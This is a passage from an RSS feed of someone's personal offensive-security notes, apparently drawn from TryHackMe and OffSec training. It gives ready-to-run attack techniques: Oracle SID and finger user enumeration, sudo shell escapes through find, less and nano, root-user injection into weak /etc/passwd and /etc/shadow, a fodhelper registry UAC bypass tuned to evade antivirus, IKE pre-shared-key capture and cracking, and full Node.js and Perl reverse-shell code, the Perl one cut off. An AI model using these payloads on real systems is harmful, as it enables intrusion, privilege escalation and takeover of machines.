&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Enumerate information about an Oracle server&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;oscanner&lt;/span&gt; -s &lt;span class=&quot;va&quot;&gt;$IP_ADDRESS&lt;/span&gt; -P &lt;span class=&quot;va&quot;&gt;$PORT&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Dictionary enumeration of Oracle server SIDs&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-11&quot;&gt;&lt;a href=&quot;#cb1-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;sidguess&lt;/span&gt; -i &lt;span class=&quot;va&quot;&gt;$IP_ADDRESS&lt;/span&gt; -d &lt;span class=&quot;va&quot;&gt;$WORDLIST_FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/slyth11907/Cheatsheets&quot;&gt;slyth11907 / Cheatsheets&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.kali.org/tools/tnscmd10g/&quot;&gt;Tnscmd10g&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.kali.org/tools/oscanner/&quot;&gt;Oscanner&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.kali.org/tools/sidguesser/&quot;&gt;Sidguesser&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Fri, 31 Mar 2023 14:10:16 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Enumerate%20Oracle%20SQL%20Server.md</guid>
		</item>
		<item>
			<title>Enumerate Users with âfingerâ</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Enumerate%20Users%20with%20%22finger%22.md</link>
			<description>&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;finger&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$USER&lt;/span&gt;@&lt;span class=&quot;va&quot;&gt;$IP_ADDRESS&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This obviously requires finger to be running and a list of users to try.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/slyth11907/Cheatsheets&quot;&gt;slyth11907 / Cheatsheets&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Fri, 31 Mar 2023 14:10:16 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Enumerate%20Users%20with%20%22finger%22.md</guid>
		</item>
		<item>
			<title>Exploiting âfindâ</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20%22find%22.md</link>
			<description>&lt;p&gt;If &lt;code&gt;find&lt;/code&gt; can be run with &lt;code&gt;sudo&lt;/code&gt;, then try &lt;code&gt;sudo find . -exec /bin/sh \; -quit&lt;/code&gt;.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/jrpenetrationtester&quot;&gt;TryHackMe: Jr. Penetration Tester&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Fri, 31 Mar 2023 14:10:16 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20%22find%22.md</guid>
		</item>
		<item>
			<title>Exploiting /etc/passwd</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20etc-passwd.md</link>
			<description>&lt;p&gt;&lt;em&gt;If&lt;/em&gt; &lt;code&gt;/etc/passwd&lt;/code&gt; has weak permissions, then passwords in it can be replaced (since Linux systems still use the password hashes in &lt;code&gt;/etc/passwd&lt;/code&gt; preferentially to those in &lt;code&gt;/etc/shadow&lt;/code&gt;). This means that we can just directly add root-equivalent users directly there (remember that the UID and primary GID can be duplicated!).&lt;/p&gt;&lt;p&gt;To generate a password acceptable for inclusion in &lt;code&gt;/etc/passwd&lt;/code&gt;:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;openssl&lt;/span&gt; passwd -1 -salt &lt;span class=&quot;va&quot;&gt;$SALT&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$PASSWORD&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/jrpenetrationtester&quot;&gt;TryHackMe: Jr. Penetration Tester&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.offensive-security.com/offsec/offsec-live/&quot;&gt;OffSec Live&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Fri, 31 Mar 2023 14:10:16 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20etc-passwd.md</guid>
		</item>
		<item>
			<title>Exploiting /etc/shadow</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20etc-shadow.md</link>
			<description>&lt;p&gt;&lt;em&gt;If&lt;/em&gt; /etc/shadow has weak permissions, then passwords in it can be replaced. To create a new password, use:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;mkpasswd&lt;/span&gt; -m sha-512 &lt;span class=&quot;va&quot;&gt;$PASSWORD&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/beginner&quot;&gt;TryHackMe: Complete Beginner&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Fri, 31 Mar 2023 14:10:16 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20etc-shadow.md</guid>
		</item>
		<item>
			<title>Exploiting the Windows âFeature on Demandâ Helper</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20the%20Windows%20%22Feature%20on%20Demand%22%20Helper.md</link>
			<description>&lt;p&gt;The fodhelper binary can be abused to gain an admin shell on Windows boxes with a couple of registry key changes. They key (heh) here is to use the CurVer registry key to point fodhelper.exe to a different registry location; otherwise most AV solutions will catch this change and block it (though sometimes the command will still execute).&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;New-Item&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;HKCU:\Software\Classes\.pwn\Shell\Open\command&amp;quot;&lt;/span&gt; -Force&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;Set-ItemProperty&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;HKCU:\Software\Classes\.pwn\Shell\Open\command&amp;quot;&lt;/span&gt; `&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    -Name &lt;span class=&quot;st&quot;&gt;&amp;quot;(default)&amp;quot;&lt;/span&gt; -Value &lt;span class=&quot;st&quot;&gt;&amp;quot;cmd.exe /c start powershell.exe&amp;quot;&lt;/span&gt; -Force&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;New-Item&lt;/span&gt; -Path &lt;span class=&quot;st&quot;&gt;&amp;quot;HKCU:\Software\Classes\ms-settings\CurVer&amp;quot;&lt;/span&gt; -Force&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;Set-ItemProperty&lt;/span&gt;  &lt;span class=&quot;st&quot;&gt;&amp;quot;HKCU:\Software\Classes\ms-settings\CurVer&amp;quot;&lt;/span&gt; `&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    -Name &lt;span class=&quot;st&quot;&gt;&amp;quot;(default)&amp;quot;&lt;/span&gt; -value &lt;span class=&quot;st&quot;&gt;&amp;quot;.pwn&amp;quot;&lt;/span&gt; -Force&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses&quot;&gt;Utilizing Programmatic Identifiers (ProgIDs) for UAC Bypasses&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Fri, 31 Mar 2023 14:10:16 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20the%20Windows%20%22Feature%20on%20Demand%22%20Helper.md</guid>
		</item>
		<item>
			<title>Exploiting IKE Aggressive Mode</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20IKE%20Aggressive%20Mode.md</link>
			<description>&lt;p&gt;In IKE aggressive mode the authentication hash based on a preshared key (PSK) is transmitted as response to the initial packet of a vpn client that wants to establish an IPSec Tunnel (&lt;code&gt;Hash_R&lt;/code&gt;). This hash is not encrypted (in main mode the hash &lt;em&gt;is&lt;/em&gt; encrypted)&lt;/p&gt;&lt;p&gt;The &lt;code&gt;ike-scan&lt;/code&gt; tool can be used to test if an IPSEC VPN server is using IKE in aggressive mode:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; ike-scan -A &lt;span class=&quot;va&quot;&gt;$IP_ADDRESS&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If aggressive mode is in use, then &lt;code&gt;ike-scan&lt;/code&gt; can be used to save the initial exchange for offline cracking:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; ike-scan -A &lt;span class=&quot;va&quot;&gt;$IP_ADDRESS&lt;/span&gt; --id=&lt;span class=&quot;va&quot;&gt;$ID&lt;/span&gt; -P&lt;span class=&quot;va&quot;&gt;$KEY_FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;psk-crack&lt;/code&gt; can then be used to (attempt) to crack the resulting &lt;code&gt;$KEY_FILE&lt;/code&gt;.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Attempt to brute-force all keys up to $KEY_LENGTH using&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# characters from $CHARSET (by default $CHARSET is numbers and&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# lowercase ASCII characters).&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-4&quot;&gt;&lt;a href=&quot;#cb3-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-5&quot;&gt;&lt;a href=&quot;#cb3-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;psk-crack&lt;/span&gt; --charset=&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$CHARSET&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt; -b &lt;span class=&quot;va&quot;&gt;$KEY_LENGTH&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$KEY_FILE&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-6&quot;&gt;&lt;a href=&quot;#cb3-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-7&quot;&gt;&lt;a href=&quot;#cb3-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Attempt to crack the PSK using a dictionary.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-8&quot;&gt;&lt;a href=&quot;#cb3-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-9&quot;&gt;&lt;a href=&quot;#cb3-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;psk-crack&lt;/span&gt; -d &lt;span class=&quot;va&quot;&gt;$WORDLIST_FILE&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$KEY_FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/slyth11907/Cheatsheets&quot;&gt;slyth11907 / Cheatsheets&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Sat, 01 Apr 2023 00:37:31 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20IKE%20Aggressive%20Mode.md</guid>
		</item>
		<item>
			<title>Exploiting âlessâ</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20%22less%22.md</link>
			<description>&lt;p&gt;Exploiting &lt;code&gt;sudo less&lt;/code&gt; is as simple as &lt;code&gt;!/bin/sh&lt;/code&gt;.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/jrpenetrationtester&quot;&gt;TryHackMe: Jr. Penetration Tester&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Sat, 01 Apr 2023 02:57:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20%22less%22.md</guid>
		</item>
		<item>
			<title>Exploiting Nano</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Nano.md</link>
			<description>&lt;p&gt;If &lt;code&gt;nano&lt;/code&gt; is allowed to be run via &lt;code&gt;sudo&lt;/code&gt; without a password, you can use the following to break out into a root shell:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;CTRL+R&lt;/code&gt; (read file)&lt;/li&gt;&lt;li&gt;&lt;code&gt;CTRL+X&lt;/code&gt; (execute file)&lt;/li&gt;&lt;li&gt;&lt;code&gt;reset; sh 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Boom!&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/jrpenetrationtester&quot;&gt;TryHackMe: Jr. Penetration Tester&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Sat, 01 Apr 2023 02:57:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Nano.md</guid>
		</item>
		<item>
			<title>Exploiting Node.js</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Node.js.md</link>
			<description>&lt;p&gt;The hard part of popping a reverse shell on a Node.js server is tricking the server to load your code. If you can figure out how to do that, this seems to produce a reliable connection:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode javascript&quot;&gt;&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;(&lt;span class=&quot;kw&quot;&gt;function&lt;/span&gt;(){&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; net &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pp&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&amp;quot;net&amp;quot;&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        cp  &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pp&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&amp;quot;child_process&amp;quot;&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        sh &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; cp&lt;span class=&quot;op&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;spawn&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt; [])&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; client &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; net&lt;span class=&quot;op&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;Socket&lt;/span&gt;()&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    client&lt;span class=&quot;op&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;connect&lt;/span&gt;(&lt;span class=&quot;dv&quot;&gt;1234&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;function&lt;/span&gt;(){&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;co&quot;&gt;// Customize port and IP address above to taste&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        client&lt;span class=&quot;op&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;pipe&lt;/span&gt;(sh&lt;span class=&quot;op&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;at&quot;&gt;stdin&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        sh&lt;span class=&quot;op&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;at&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;pipe&lt;/span&gt;(client)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        sh&lt;span class=&quot;op&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;at&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;pipe&lt;/span&gt;(client)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-11&quot;&gt;&lt;a href=&quot;#cb1-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    })&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-12&quot;&gt;&lt;a href=&quot;#cb1-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;cf&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;/a/&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// Prevents Node.js from crashing&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-13&quot;&gt;&lt;a href=&quot;#cb1-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;})()&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md&quot;&gt;Reverse Shell Cheat Sheet&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Sat, 01 Apr 2023 02:57:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Node.js.md</guid>
		</item>
		<item>
			<title>Exploiting Perl</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Perl.md</link>
			<description>&lt;p&gt;A simple reverse shell:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode perl&quot;&gt;&lt;code class=&quot;sourceCode perl&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;use&lt;/span&gt; Socket;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;$attacker_ip&lt;/span&gt;=&lt;span class=&quot;kw&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;10.0.0.1&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;$attacker_port&lt;/span&gt;=&lt;span class=&quot;dv&quot;&gt;1234&lt;/span&gt;;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;socket&lt;/span&gt;(S, PF_INET, SOCK_STREAM, &lt;span class=&quot;fu&quot;&gt;getprotobyname&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;tcp&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;quot;&lt;/span&gt;));&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;fu&quot;&gt;connect&lt;/span&gt;(S,sockaddr_in(&lt;span class=&quot;dt&quot;&gt;$attacker_port&lt;/span&gt;, inet_aton(&lt;span class=&quot;dt&quot;&gt;$attacker_ip&lt;/span&gt;)))){&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;open&lt;/span&gt;(STDIN, &lt;span class=&quot;kw&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;gt;&amp;amp;S&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;quot;&lt;/span&gt;);&lt;/span&gt;
